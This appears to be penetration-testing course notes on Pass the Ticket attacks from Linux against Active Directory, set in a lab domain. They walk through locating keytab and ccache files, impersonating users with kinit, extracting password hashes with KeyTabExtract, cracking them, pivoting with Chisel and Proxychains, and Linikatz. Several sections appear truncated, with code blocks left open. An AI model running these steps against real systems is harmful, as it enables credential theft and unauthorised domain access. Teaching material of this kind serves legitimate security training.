# Pass the Ticket (PtT) from Linux

Linux computers can connect to `Active Directory` for centralized identity management, allowing `single sign-on across Linux and Windows systems` using `Kerberos` authentication. If we compromise a Linux machine connected to AD, we can extract Kerberos tickets to impersonate users and expand network access.

Linux systems store Kerberos tickets in `various` ways, which we'll explore in this section.

**Note:** Domain membership isn't required—Linux machines can use Kerberos tickets for scripts or network authentication without joining Active Directory.

## 1. Kerberos on Linux

Windows and Linux use identical processes for requesting TGTs and TGS tickets, but storage methods vary by Linux distribution and implementation.

Linux typically stores Kerberos `tickets` as `ccache` files in `/tmp`. The `KRB5CCNAME` environment variable indicates ticket usage and location changes. While these files have specific permissions, elevated or root users can access them.

`Keytab` files are another common Kerberos implementation—they contain Kerberos principals and encrypted keys derived from passwords. Keytabs enable passwordless authentication to remote systems but require recreation when passwords change.

`Scripts` commonly use `keytab` files for automatic Kerberos authentication without human interaction or plaintext password storage, such as accessing Windows shares.

**Note:** Any system with a Kerberos client can create keytab files, and they're portable between computers since they're not system-restricted.

## 4. Finding Kerberos tickets in Linux

As an attacker, we are always looking for credentials. On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings.

## 5. Finding KeyTab files

A straightforward approach is to use `find` to search for files whose name contains the word `keytab`. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab`. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.

**Using Find to search for files with keytab in the name:**

```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

...SNIP...

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

**Note: To use a keytab file, we must have read and write (rw) privileges on the file.**

Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. 

**Identifying KeyTab files in Cronjobs:**

```
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

The script uses `kinit`, indicating Kerberos usage. `kinit` requests the user's TGT and stores it in cache (ccache file), and can import keytab files to act as specific users.

This example shows a script importing a Kerberos ticket (`svc_workstations.kt`) for `svc_workstations@INLANEFREIGHT.HTB` before connecting to a shared folder.

**Note:** Like Windows, Linux domain-joined machines need tickets for Active Directory interaction. The machine account ticket is a keytab file at `/etc/krb5.keytab` (root-readable only). Accessing this ticket allows impersonation of the computer account `LINUX01$.INLANEFREIGHT.HTB`.

## 6. Finding ccache files

`Ccache` files store Kerberos credentials during valid sessions. After domain authentication, a ccache file is created and its path stored in the `KRB5CCNAME` environment variable, which Kerberos-enabled tools use to locate credentials.

**Reviewing environment variables for ccache files:**

```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

`Ccache` files default to `/tmp`. With root or privileged access, we can search for logged-on users and impersonate them using their valid ccache files.

**Searching for ccache files in /tmp:**

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau

## 7. Abusing KeyTab files

As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using `kinit`. To use a keytab file, we need to know which user it was created for. `klist` is another application used to interact with Kerberos on Linux. This application reads information from a `keytab` file. Let's see that with the following command:

**Listing KeyTab file information:**

```
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

The ticket corresponds to the user Carlos. We can now impersonate the user with `kinit`. Let's confirm which ticket we are using with `klist` and then import Carlos's ticket into our session with `kinit`.

**Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.**

**Impersonating a user with a KeyTab:**

```
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist

        renew until 10/07/22 17:16:11
```

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

**Connecting to SMB Share as Carlos:**

## 8. KeyTab Extract

The second Kerberos abuse method involves extracting secrets from keytab files. While we impersonated Carlos to access domain shares using his tickets, accessing his Linux account requires his password.

We can crack the password by extracting hashes from the keytab file using KeyTabExtract, a tool for extracting information from 502-type `.keytab` files used for Linux Kerberos authentication. It extracts realm, Service Principal, Encryption Type, and hashes.

**Extracting KeyTab hashes with KeyTabExtract:**

```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

**Note: A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.**

The most straightforward hash to crack is the NTLM hash. We can use tools like `Hashcat` or `John the Ripper` to crack it. However, a quick way to decrypt passwords is with online repositories such as `https://crackstation.net/`, which contains billions of passwords.

**Log in as Carlos:**

```
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist

Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

## 11. Using Linux attack tools with Kerberos

Many Linux attack tools support Kerberos authentication with Windows/Active Directory. On domain-joined machines, ensure `KRB5CCNAME` points to the desired ccache file. On non-domain machines like attack hosts, ensure KDC/Domain Controller connectivity and working domain name resolution.

When our attack host can't reach the KDC/Domain Controller or use it for name resolution, we must proxy traffic through `MS01` using tools like Chisel and Proxychains, and edit `/etc/hosts` to hardcode domain and target machine IP addresses.

**Host file modified:**

```
[!bash!]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

We need to modify our proxychains configuration file to use socks5 and port 1080.

**Proxychains configuration file:**

```
[!bash!]$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

We must download and execute `chisel` on our attack host.

**Download Chisel to our attack host:**

```
[!bash!]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
[!bash!]$ gzip -d chisel_1.7.7_linux_amd64.gz
[!bash!]$ mv chisel_* chisel && chmod +x ./chisel
[!bash!]$ sudo ./chisel server --reverse

## 13. Linikatz

Linikatz is Cisco's tool for exploiting credentials on Linux machines integrated with Active Directory, bringing Mimikatz-like functionality to UNIX environments.

Like Mimikatz, Linikatz requires root access and extracts all credentials including Kerberos tickets from various implementations (FreeIPA, SSSD, Samba, Vintella, etc.).
